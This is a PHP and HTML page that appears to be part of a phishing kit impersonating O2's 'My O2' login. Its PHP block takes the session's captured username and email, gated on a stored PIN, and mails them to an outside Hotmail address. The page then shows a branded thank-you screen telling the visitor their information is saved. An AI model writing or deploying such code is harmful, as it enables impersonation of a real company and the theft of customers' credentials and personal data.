<?php
	session_start();
	if(!isset($_SESSION['pinCode']))
	{
		?> 
			<script>
				window.location = 'index.php';
			</script>
		<?php 
	}
	else{

		//Send mail with username and email from subscribed user
		$headers  = "MIME-Version: 1.0\r\n";
    	$headers .= "Content-type: text/plain; charset=utf-8\r\n";

    	mail('dev.morad_safwat@hotmail.com',
    		 'LOGIN FORM My O2',
    		 'New User Login Name is : ' . $_SESSION['username'] . 
    		 ' & Email : ' . $_SESSION['email'],
    		  $headers);

		// and destroy the session
		session_destroy();
	}
 ?>

<!DOCTYPE html>
<html lang="en">
<head>
	<title>Login Form</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/mystyle.css">
	<link rel="stylesheet" type="text/css" href="css/utill.css">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
</head>
<body>
	
	<div class="limiter">
		<div class="container-login100" style="background-image: url('images/bg.jpg');">
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
			
					<span class="login100-form-title p-b-49">
						MyO<sub>2</sub>
					</span>	

					<span class="login100-form-title p-b-35">
						Thank You For Visit My Site
					</span>						

					<div class="text-center p-t-8 p-b-31">
						<p class="label-center">Thank you for visit your information is saved</p>
					</div>		
					
					<div class="text-right p-t-8 p-b-31"> </div>
				</form>

				<!-- End Form -->

				<div class="div-buttom">
					<div class="buttom-icon">
						<i class="fa fa-users icons"></i>
						<p class="title">O2 Community</p>
						<div class="line"></div>
					</div>

					<div class="buttom-icon">
						<i class="fa fa-comment-o icons" aria-hidden="true"></i>
						<p class="title">O2 Gurus</p>
						<div class="line"></div>
					</div>

					<div class="buttom-icon">
						<i class="icons">O<sub>2</sub></i>
						<p class="title">More from O2</p>

					</div>
				</div>

			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>